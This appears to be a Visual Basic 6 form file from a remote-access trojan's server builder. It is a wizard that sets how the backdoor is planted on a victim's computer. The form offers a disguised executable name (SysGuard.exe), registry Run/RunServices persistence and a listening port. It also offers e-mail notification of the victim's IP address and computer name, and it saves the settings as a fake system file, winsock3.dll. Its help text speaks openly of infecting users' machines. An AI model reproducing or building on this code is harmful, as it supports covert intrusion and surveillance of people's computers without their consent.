VERSION 5.00
Begin VB.Form frmConfig 
   AutoRedraw      =   -1  'True
   BackColor       =   &H00000000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Configure Server"
   ClientHeight    =   3885
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   4095
   BeginProperty Font 
      Name            =   "MS Sans Serif"
      Size            =   8.25
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3885
   ScaleWidth      =   4095
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton cmdBack 
      Caption         =   "<<Back"
      Enabled         =   0   'False
      Height          =   375
      Left            =   1920
      TabIndex        =   29
      Top             =   3360
      Width           =   975
   End
   Begin VB.Frame frm6 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   3255
      Left            =   120
      TabIndex        =   20
      Top             =   0
      Visible         =   0   'False
      Width           =   3855
      Begin VB.CheckBox chkEditReg 
         BackColor       =   &H00404040&
         Caption         =   "Do not edit the registry."
         ForeColor       =   &H0000C000&
         Height          =   255
         Left            =   240
         TabIndex        =   36
         Top             =   1200
         Width           =   3495
      End
      Begin VB.Frame Frame8 
         BackColor       =   &H00404040&
         BorderStyle     =   0  'None
         Caption         =   "Frame8"
         Height          =   495
         Left            =   360
         TabIndex        =   26
         Top             =   2640
         Width           =   2175
         Begin VB.OptionButton optRegSer 
            BackColor       =   &H00404040&
            Caption         =   "Reg- RunServices"
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   0
            TabIndex        =   28
            Top             =   0
            Width           =   1935
         End
         Begin VB.OptionButton optRegRun 
            BackColor       =   &H00404040&
            Caption         =   "Reg- Run"
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   0
            MaskColor       =   &H0000C000&
            TabIndex        =   27
            Top             =   240
            Width           =   1575
         End
      End
      Begin VB.Frame Frame7 
         BackColor       =   &H00404040&
         BorderStyle     =   0  'None
         Caption         =   "Frame7"
         Height          =   495
         Left            =   360
         TabIndex        =   23
         Top             =   1800
         Width           =   2295
         Begin VB.OptionButton optRegSer2 
            BackColor       =   &H00404040&
            Caption         =   "Reg- RunServices"
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   0
            TabIndex        =   25
            Top             =   240
            Width           =   1935
         End
         Begin VB.OptionButton optRegRun2 
            BackColor       =   &H00404040&
            Caption         =   "Reg- Run"
            ForeColor       =   &H0000C000&
            Height          =   255
            Left            =   0
            MaskColor       =   &H0000C000&
            TabIndex        =   24
            Top             =   0
            Width           =   1575
         End
      End
      Begin VB.Label Label7 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "HKEY_CURRENT_USER"
         ForeColor       =   &H0000C000&
         Height          =   195
         Left            =   240
         TabIndex        =   30
         Top             =   2400
         Width           =   2130
      End
      Begin VB.Label Label6 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "HKEY_LOCAL_MACHINE"
         ForeColor       =   &H0000C000&
         Height          =   195
         Left            =   240
         TabIndex        =   22
         Top             =   1560
         Width           =   2145
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   $"frmConfig.frx":0000
         ForeColor       =   &H0000C000&
         Height          =   1095
         Index           =   1
         Left            =   240
         TabIndex        =   21
         Top             =   240
         Width           =   3495
      End
   End
   Begin VB.Frame frm4 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H00000000&
      Height          =   1215
      Left            =   120
      TabIndex        =   15
      Top             =   0
      Visible         =   0   'False
      Width           =   3855
      Begin VB.CheckBox chkUDServer 
         Caption         =   "Check2"
         Height          =   195
         Left            =   120
         TabIndex        =   18
         Top             =   240
         Width           =   135
      End
      Begin VB.TextBox Text2 
         BackColor       =   &H00404040&
         ForeColor       =   &H00008000&
         Height          =   285
         Left            =   360
         TabIndex        =   17
         Text            =   "SysGuard.exe"
         Top             =   720
         Width           =   2655
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "Enter a name for the Server. Or you may choose to use the default."
         ForeColor       =   &H0000C000&
         Height          =   375
         Index           =   0
         Left            =   360
         TabIndex        =   16
         Top             =   240
         Width           =   3375
      End
   End
   Begin VB.Frame frm1 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   735
      Left            =   120
      TabIndex        =   10
      Top             =   120
      Width           =   3855
      Begin VB.OptionButton optNoInstall 
         BackColor       =   &H00404040&
         Caption         =   "Not installed"
         ForeColor       =   &H0000C000&
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   240
         Width           =   1455
      End
      Begin VB.OptionButton optInstall 
         BackColor       =   &H00404040&
         Caption         =   "Installed"
         ForeColor       =   &H0000C000&
         Height          =   255
         Left            =   2040
         TabIndex        =   11
         Top             =   240
         Width           =   1575
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "?"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   13.5
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FFFF&
         Height          =   360
         Left            =   1680
         TabIndex        =   13
         Top             =   240
         Width           =   180
      End
   End
   Begin VB.Frame frm3 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      Caption         =   "Server Path"
      ForeColor       =   &H0000C000&
      Height          =   615
      Left            =   120
      TabIndex        =   8
      Top             =   1200
      Visible         =   0   'False
      Width           =   3855
      Begin VB.TextBox Text1 
         BackColor       =   &H00404040&
         ForeColor       =   &H00008000&
         Height          =   285
         Left            =   120
         TabIndex        =   9
         Top             =   240
         Width           =   3615
      End
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Exit"
      Height          =   375
      Left            =   120
      TabIndex        =   7
      Top             =   3360
      Width           =   855
   End
   Begin VB.CommandButton cmdNext 
      Caption         =   "Next>>"
      Height          =   375
      Left            =   3000
      TabIndex        =   6
      Top             =   3360
      Width           =   975
   End
   Begin VB.Frame frm5 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   1455
      Left            =   120
      TabIndex        =   1
      Top             =   1800
      Visible         =   0   'False
      Width           =   3855
      Begin VB.CheckBox chkPword 
         Caption         =   "Check1"
         Height          =   195
         Left            =   120
         TabIndex        =   14
         Top             =   240
         Width           =   135
      End
      Begin VB.TextBox txtPWord 
         BackColor       =   &H00404040&
         ForeColor       =   &H00008000&
         Height          =   315
         IMEMode         =   3  'DISABLE
         Left            =   360
         MaxLength       =   16
         PasswordChar    =   "%"
         TabIndex        =   4
         Top             =   840
         Width           =   1335
      End
      Begin VB.TextBox txtReEnter 
         BackColor       =   &H00404040&
         ForeColor       =   &H00008000&
         Height          =   315
         IMEMode         =   3  'DISABLE
         Left            =   2040
         MaxLength       =   16
         PasswordChar    =   "%"
         TabIndex        =   3
         Top             =   840
         Width           =   1335
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "Enter a password for future changes to the server. Re-Enter when done."
         ForeColor       =   &H0000C000&
         Height          =   375
         Left            =   360
         TabIndex        =   2
         Top             =   240
         Width           =   3375
      End
   End
   Begin VB.Frame frm2 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   2415
      Left            =   120
      TabIndex        =   0
      Top             =   840
      Width           =   3855
      Begin VB.CommandButton Command1 
         Caption         =   "Setup E-mail"
         Height          =   255
         Left            =   480
         TabIndex        =   35
         Top             =   2040
         Width           =   1455
      End
      Begin VB.OptionButton optScanPorts 
         BackColor       =   &H00404040&
         Caption         =   "Option4"
         Height          =   255
         Left            =   120
         TabIndex        =   32
         Top             =   600
         Width           =   255
      End
      Begin VB.OptionButton optSetPort 
         BackColor       =   &H00404040&
         Caption         =   "Option3"
         Height          =   255
         Left            =   120
         TabIndex        =   31
         Top             =   240
         Width           =   255
      End
      Begin VB.TextBox txtPort 
         BackColor       =   &H00404040&
         ForeColor       =   &H0000C000&
         Height          =   315
         Left            =   2280
         TabIndex        =   5
         Text            =   "1256"
         Top             =   240
         Width           =   1335
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "E-Mail Notify - Set the options here if you want to be notified of the users IP address and Com Name."
         ForeColor       =   &H0000C000&
         Height          =   555
         Left            =   480
         TabIndex        =   34
         Top             =   1320
         Width           =   3210
      End
      Begin VB.Label Label8 
         BackStyle       =   0  'Transparent
         Caption         =   "Scan for open ports when a net connection is active. E-mail the port to the administrator"
         ForeColor       =   &H0000C000&
         Height          =   555
         Left            =   480
         TabIndex        =   33
         Top             =   600
         Width           =   3210
      End
      Begin VB.Label Label5 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Set Listening Port:"
         ForeColor       =   &H0000C000&
         Height          =   195
         Left            =   480
         TabIndex        =   19
         Top             =   240
         Width           =   1590
      End
   End
End
Attribute VB_Name = "frmConfig"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Dim PageShowing As Integer
Dim NextPage As Integer


' Data PAGES
Private Type PageData
   ' data on page 1
   bInstalled As Boolean
   bSetPort As Boolean
   ' data on page 2
   bUseDefaultServerName As Boolean
   sServerPath As String
   sUDServerName As String
   bUsePWord As Boolean
   sPWord As String
   ' data on page 3
   bEditReg As Boolean
   sRegEditLoc_1 As String
   sRegEditLoc_2 As String
End Type

Dim C As PageData

Private Sub chkEditReg_Click()
    If chkEditReg.Value = vbChecked Then
       C.bEditReg = True
    Else
       C.bEditReg = False
    End If
End Sub

Private Sub chkPword_Click()
   If chkPword.Value = vbChecked Then
     txtPWord.SetFocus
     C.bUsePWord = True
   Else
     C.bUsePWord = False
   End If
End Sub

Private Sub chkUDServer_Click()
   If chkUDServer.Value = vbChecked Then
     Text2.SelLength = Len(Text2)
     Text2.SetFocus
     C.bUseDefaultServerName = False
   Else
     C.bUseDefaultServerName = True
   End If
End Sub

Private Sub cmdBack_Click()
    ' retract to the previous page.
    NextPage = NextPage - 1
    
    ShowNextPage NextPage
    ' update the pageshowing var
    PageShowing = NextPage
    If NextPage < 3 Then cmdNext.Caption = "&Next>>"
End Sub

Private Sub cmdNext_Click()
    Dim bPassed As Boolean
    
    
    
    ' advance to next page.
    NextPage = NextPage + 1
    
    '
    ' Check data on THIS page to make sure its correct
    ' before advanceing the next page.
    '
    bPassed = CheckPage(PageShowing)
          
    If bPassed Then
      ShowNextPage NextPage
    Else
      MsgBox "Invalid field detected!", vbInformation, "Missing Data"
      'decrement NextPage
      NextPage = PageShowing
      Exit Sub
    End If
    
    If cmdNext.Caption = "&Save" Then
       ' Save the Info
       
       ' by now all the info should be filled in...
       If C.bInstalled Then
         ' in this case the data is being changed for the server
         ' on the host computer. save in the sys dir
         Open Sysdir & "winsock3.dll" For Binary As #1
             Put #1, , C
         Close #1
         MsgBox "Saved as " & Sysdir & "winsock3.dll"
       Else
         ' in this case it is being saved on the ame puter for
         ' testing purposes
         Open App.Path & "\winsock3.dll" For Binary As #1
             Put #1, , C
         Close #1
         MsgBox "Saved as " & App.Path & "\winsock3.dll"
       End If
       
       
       Exit Sub
    End If
    
    ' update the pageshowing var
    PageShowing = NextPage
    If NextPage = 3 Then cmdNext.Caption = "&Save"
End Sub

Private Sub Command1_Click()
    frmSetMail.Show
End Sub

Private Sub Form_Load()
    txtPort.SelLength = 4
    PageShowing = 1
    NextPage = 1
    
    ' set defaults.
    optNoInstall = True
    optSetPort = True
    C.sRegEditLoc_2 = "HKEY_LOCAL_MACHINE\Run"
End Sub

'///////////////////////////////////////////////////////////////////////////////
'///////////////////////////////////////////////////////////////////////////////
'///////////////////////////////////////////////////////////////////////////////
Private Function CheckPage(PageNum As Integer) As Boolean
    '
    ' Assume success
    CheckPage = True
    
    Select Case PageNum
       Case 1
           ' fall through nothing to check on 1
       Case 2
           If chkUDServer.Value = vbChecked Then
              ' make sure a server name was entered.
              If C.sUDServerName = "" Then CheckPage = False
           End If
           
           If C.sServerPath = "" Then CheckPage = False
           
           If chkPword.Value = vbChecked Then
              ' make sure both fields were filled
              If txtPWord = "" Or txtReEnter = "" Then
                 CheckPage = False
              Else
                 ' make sure they match
                 Dim IsSame As Boolean
                 
                 IsSame = TestPwInput(txtPWord, txtReEnter)
                 
                 If (Not IsSame) Then
                    MsgBox "The Passwords do not match!"
                    CheckPage = False
                 End If
              End If
              
           End If
       Case 3
          ' nothing to check on 3
       
    End Select
End Function

Private Sub ShowNextPage(iPageShowing As Integer)
      
      'which pag are we showing
      Select Case iPageShowing
         Case 1
            frm1.Visible = True
            frm2.Visible = True
            cmdBack.Enabled = False
            HidePage 2, True, 3
         Case 2
            frm3.Visible = True
            frm4.Visible = True
            frm5.Visible = True
            cmdBack.Enabled = True
            HidePage 3, True, 1
         Case 3
            frm6.Visible = True
            cmdBack.Enabled = True
            
            HidePage 1, True, 2
      End Select
      
      
End Sub


Private Sub HidePage(iPagetoHide As Integer, Recall As Boolean, Optional iNextPage As Integer)
      
      Select Case iPagetoHide
          Case 1
            frm1.Visible = False
            frm2.Visible = False
          Case 2
            frm3.Visible = False
            frm4.Visible = False
            frm5.Visible = False
          Case 3
            frm6.Visible = False
      End Select
      
      If Recall Then
          HidePage iNextPage, False
      End If
       
End Sub

Private Function TestPwInput(PWord As String, ReEnter As String) As Boolean
     
     Dim CompRes As Integer
     
     CompRes = StrComp(PWord, ReEnter, vbBinaryCompare)
          
     If CompRes = 0 Then
        TestPwInput = True
     Else
        TestPwInput = False
     End If
     
End Function


Private Sub Label3_DblClick()
    MsgBox "You can cofigure the server while it is on the users machine and actively running. " _
           & " Choose the Intalled option for this. To cofigure the server before installation " _
           & "on the users machine choose not Installed. Ths will allow you to test the features " _
           & "without worry of infecting yourself.", , "Server Configuration."
End Sub



Private Sub optInstall_Click()
     If optInstall Then C.bInstalled = True
End Sub

Private Sub optNoInstall_Click()
     If optNoInstall Then C.bInstalled = False
End Sub

Private Sub optRegRun_Click()
     If optRegRun Then C.sRegEditLoc_1 = "HKEY_CURRENT_USER\Run"
End Sub

Private Sub optRegRun2_Click()
     If optRegRun2 Then C.sRegEditLoc_2 = "HKEY_LOCAL_MACHINE\Run"
End Sub

Private Sub optRegSer_Click()
     If optRegSer Then C.sRegEditLoc_1 = "HKEY_CURRENT_USER\RunServices"
End Sub

Private Sub optRegSer2_Click()
     If optRegSer2 Then C.sRegEditLoc_2 = "HKEY_LOCAL_MACHINE\RunServices"
End Sub

Private Sub optScanPorts_Click()
     If optScanPorts Then C.bSetPort = False
End Sub

Private Sub optSetPort_Click()
     If optSetPort Then C.bSetPort = True
End Sub

Private Sub Text1_Change()
    C.sServerPath = Text1
End Sub

Private Sub Text2_Change()
     C.sUDServerName = Text2
End Sub


